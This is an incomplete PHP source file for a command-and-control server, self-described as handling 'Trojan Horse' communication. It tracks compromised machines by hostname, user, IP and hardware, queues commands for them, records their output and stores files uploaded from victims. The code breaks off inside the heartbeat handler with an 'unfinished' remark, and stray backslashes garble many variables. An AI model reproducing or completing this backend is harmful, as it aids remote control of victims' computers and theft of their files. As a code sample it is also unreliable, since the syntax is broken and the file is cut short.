<?php
// C2 Server for Trojan Horse Communication

// Database configuration
\$db_host = 'localhost';
\$db_name = 'c2_server';
\$db_user = 'root';
\$db_pass = '';

// Create database connection
try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, \$db_pass);
    \$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException \$e) {
    // Create database if it doesn't exist
    try {
        $pdo = new PDO("mysql:host=$db_host", $db_user, $db_pass);
        \$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        $pdo->exec("CREATE DATABASE IF NOT EXISTS $db_name");
        $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, \$db_pass);
        \$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Create tables
        \$pdo->exec("
            CREATE TABLE IF NOT EXISTS clients (
                id INT AUTO_INCREMENT PRIMARY KEY,
                hostname VARCHAR(255) NOT NULL,
                username VARCHAR(255) NOT NULL,
                public_ip VARCHAR(45) NOT NULL,
                first_seen DATETIME NOT NULL,
                last_seen DATETIME NOT NULL,
                os VARCHAR(100),
                cpu_count INT,
                memory BIGINT,
                status ENUM('active', 'inactive', 'dead') DEFAULT 'active'
            )
        ");
        
        \$pdo->exec("
            CREATE TABLE IF NOT EXISTS commands (
                id INT AUTO_INCREMENT PRIMARY KEY,
                client_id INT NOT NULL,
                command VARCHAR(255) NOT NULL,
                parameters TEXT,
                created_at DATETIME NOT NULL,
                executed_at DATETIME,
                result TEXT,
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        ");
        
        \$pdo->exec("
            CREATE TABLE IF NOT EXISTS files (
                id INT AUTO_INCREMENT PRIMARY KEY,
                client_id INT NOT NULL,
                filename VARCHAR(255) NOT NULL,
                data LONGTEXT NOT NULL,
                uploaded_at DATETIME NOT NULL,
                FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
            )
        ");
        
        \$pdo->exec("
            CREATE TABLE IF NOT EXISTS blacklisted_ips (
                id INT AUTO_INCREMENT PRIMARY KEY,
                ip VARCHAR(45) NOT NULL,
                reason VARCHAR(255),
                blacklisted_at DATETIME NOT NULL,
                duration INT DEFAULT 86400,
                INDEX (ip)
            )
        ");
    } catch(PDOException \$e) {
        die("Database connection failed: " . \$e->getMessage());
    }
}

// Function to check if IP is blacklisted
function isBlacklisted(\$ip) {
    global \$pdo;
    
    $stmt = $pdo->prepare("SELECT * FROM blacklisted_ips WHERE ip = :ip AND DATE_ADD(blacklisted_at, INTERVAL duration SECOND) > NOW()");
    $stmt->execute(['ip' => $ip]);
    
    return \$stmt->rowCount() > 0;
}

// Function to blacklist an IP
function blacklistIP(\$ip, $reason = 'malware', $duration = 86400) {
    global \$pdo;
    
    // Check if already blacklisted
    if (isBlacklisted(\$ip)) {
        return false;
    }
    
    $stmt = $pdo->prepare("INSERT INTO blacklisted_ips (ip, reason, blacklisted_at, duration) VALUES (:ip, :reason, NOW(), :duration)");
    $stmt->execute(['ip' => $ip, 'reason' => $reason, 'duration' => $duration]);
    
    // Add to .htaccess if applicable
    if (file_exists('.htaccess')) {
        \$htaccess = file_get_contents('.htaccess');
        $ip_rule = "RewriteCond %{REMOTE_ADDR} ^$ip\$ [NC]\nRewriteRule .* - [F,L]\n";
        
        if (strpos(\$htaccess, \$ip_rule) === false) {
            file_put_contents('.htaccess', $htaccess . "\n# Blocked IP: $ip\n" . \$ip_rule);
        }
    }
    
    return true;
}

// Function to update or create a client
function updateClient(\$hostname, \$username, $public_ip, $os, $cpu_count, $memory) {
    global \$pdo;
    
    // Check if client already exists
    $stmt = $pdo->prepare("SELECT id FROM clients WHERE hostname = :hostname AND username = :username");
    $stmt->execute(['hostname' => $hostname, 'username' => \$username]);
    
    if (\$stmt->rowCount() > 0) {
        // Update existing client
        $client_id = $stmt->fetch(PDO::FETCH_ASSOC)['id'];
        
        $stmt = $pdo->prepare("
            UPDATE clients 
            SET public_ip = :public_ip, last_seen = NOW(), os = :os, cpu_count = :cpu_count, memory = :memory, status = 'active'
            WHERE id = :client_id
        ");
        \$stmt->execute([
            'public_ip' => \$public_ip,
            'os' => \$os,
            'cpu_count' => \$cpu_count,
            'memory' => \$memory,
            'client_id' => \$client_id
        ]);
        
        return \$client_id;
    } else {
        // Create new client
        $stmt = $pdo->prepare("
            INSERT INTO clients (hostname, username, public_ip, first_seen, last_seen, os, cpu_count, memory, status)
            VALUES (:hostname, :username, :public_ip, NOW(), NOW(), :os, :cpu_count, :memory, 'active')
        ");
        \$stmt->execute([
            'hostname' => \$hostname,
            'username' => \$username,
            'public_ip' => \$public_ip,
            'os' => \$os,
            'cpu_count' => \$cpu_count,
            'memory' => \$memory
        ]);
        
        return \$pdo->lastInsertId();
    }
}

// Function to get pending commands for a client
function getPendingCommands(\$client_id) {
    global \$pdo;
    
    $stmt = $pdo->prepare("
        SELECT command, parameters 
        FROM commands 
        WHERE client_id = :client_id AND executed_at IS NULL
        ORDER BY created_at ASC
    ");
    $stmt->execute(['client_id' => $client_id]);
    
    \$commands = [];
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        \$command = [
            'command' => \$row['command']
        ];
        
        if (\$row['parameters']) {
            $params = json_decode($row['parameters'], true);
            if (is_array(\$params)) {
                $command = array_merge($command, \$params);
            }
        }
        
        $commands[] = $command;
        
        // Mark command as executed
        $update_stmt = $pdo->prepare("UPDATE commands SET executed_at = NOW() WHERE client_id = :client_id AND command = :command AND executed_at IS NULL LIMIT 1");
        $update_stmt->execute(['client_id' => $client_id, 'command' => \$row['command']]);
    }
    
    return \$commands;
}

// Function to add a command for a client
function addCommand($client_id, $command, \$parameters = null) {
    global \$pdo;
    
    $stmt = $pdo->prepare("
        INSERT INTO commands (client_id, command, parameters, created_at)
        VALUES (:client_id, :command, :parameters, NOW())
    ");
    
    \$params = [
        'client_id' => \$client_id,
        'command' => \$command
    ];
    
    if (\$parameters) {
        $params['parameters'] = is_string($parameters) ? $parameters : json_encode($parameters);
    }
    
    $stmt->execute($params);
    
    return \$pdo->lastInsertId();
}

// Function to save a file from a client
function saveFile($client_id, $filename, \$data) {
    global \$pdo;
    
    $stmt = $pdo->prepare("
        INSERT INTO files (client_id, filename, data, uploaded_at)
        VALUES (:client_id, :filename, :data, NOW())
    ");
    
    \$stmt->execute([
        'client_id' => \$client_id,
        'filename' => \$filename,
        'data' => \$data
    ]);
    
    return \$pdo->lastInsertId();
}

// Function to save command result
function saveCommandResult($client_id, $command, $exit_code, $stdout, \$stderr) {
    global \$pdo;
    
    \$result = [
        'exit_code' => \$exit_code,
        'stdout' => \$stdout,
        'stderr' => \$stderr
    ];
    
    $stmt = $pdo->prepare("
        UPDATE commands 
        SET result = :result, executed_at = NOW()
        WHERE client_id = :client_id AND command = :command AND executed_at IS NULL
        ORDER BY created_at DESC
        LIMIT 1
    ");
    
    \$stmt->execute([
        'result' => json_encode(\$result),
        'client_id' => \$client_id,
        'command' => \$command
    ]);
    
    return \$stmt->rowCount() > 0;
}

// Function to get all clients
function getAllClients() {
    global \$pdo;
    
    $stmt = $pdo->prepare("
        SELECT id, hostname, username, public_ip, first_seen, last_seen, os, cpu_count, memory, status
        FROM clients
        ORDER BY last_seen DESC
    ");
    \$stmt->execute();
    
    return \$stmt->fetchAll(PDO::FETCH_ASSOC);
}

// Function to get client details
function getClientDetails(\$client_id) {
    global \$pdo;
    
    $stmt = $pdo->prepare("
        SELECT * FROM clients WHERE id = :client_id
    ");
    $stmt->execute(['client_id' => $client_id]);
    
    $client = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (\$client) {
        // Get command history
        $cmd_stmt = $pdo->prepare("
            SELECT command, parameters, created_at, executed_at, result
            FROM commands
            WHERE client_id = :client_id
            ORDER BY created_at DESC
            LIMIT 50
        ");
        $cmd_stmt->execute(['client_id' => $client_id]);
        
        $client['commands'] = $cmd_stmt->fetchAll(PDO::FETCH_ASSOC);
        
        // Get files
        $file_stmt = $pdo->prepare("
            SELECT id, filename, uploaded_at
            FROM files
            WHERE client_id = :client_id
            ORDER BY uploaded_at DESC
            LIMIT 20
        ");
        $file_stmt->execute(['client_id' => $client_id]);
        
        $client['files'] = $file_stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    
    return \$client;
}

// Function to get file content
function getFileContent(\$file_id) {
    global \$pdo;
    
    $stmt = $pdo->prepare("
        SELECT data FROM files WHERE id = :file_id
    ");
    $stmt->execute(['file_id' => $file_id]);
    
    $file = $stmt->fetch(PDO::FETCH_ASSOC);
    
    return \$file ? \$file['data'] : null;
}

// Function to get blacklisted IPs
function getBlacklistedIPs() {
    global \$pdo;
    
    $stmt = $pdo->prepare("
        SELECT ip, reason, blacklisted_at, duration
        FROM blacklisted_ips
        WHERE DATE_ADD(blacklisted_at, INTERVAL duration SECOND) > NOW()
        ORDER BY blacklisted_at DESC
    ");
    \$stmt->execute();
    
    return \$stmt->fetchAll(PDO::FETCH_ASSOC);
}

// Function to delete a client
function deleteClient(\$client_id) {
    global \$pdo;
    
    $stmt = $pdo->prepare("DELETE FROM clients WHERE id = :client_id");
    $stmt->execute(['client_id' => $client_id]);
    
    return \$stmt->rowCount() > 0;
}

// Function to update client status
function updateClientStatus($client_id, $status) {
    global \$pdo;
    
    $stmt = $pdo->prepare("
        UPDATE clients
        SET status = :status
        WHERE id = :client_id
    ");
    
    \$stmt->execute([
        'status' => \$status,
        'client_id' => \$client_id
    ]);
    
    return \$stmt->rowCount() > 0;
}

// Handle API requests
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get input data
    \$input = json_decode(file_get_contents('php://input'), true);
    
    // Get client IP
    $client_ip = $_SERVER['REMOTE_ADDR'];
    
    // Check if IP is blacklisted
    if (isBlacklisted(\$client_ip)) {
        http_response_code(403);
        die('Access denied');
    }
    
    // Determine request type based on URL
    $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    
    if (\$path === '/api/heartbeat') {
        // Handle heartbeat from client
        $hostname = $



          #warning this projecct is currently unfinished i will finish it till i relax
   
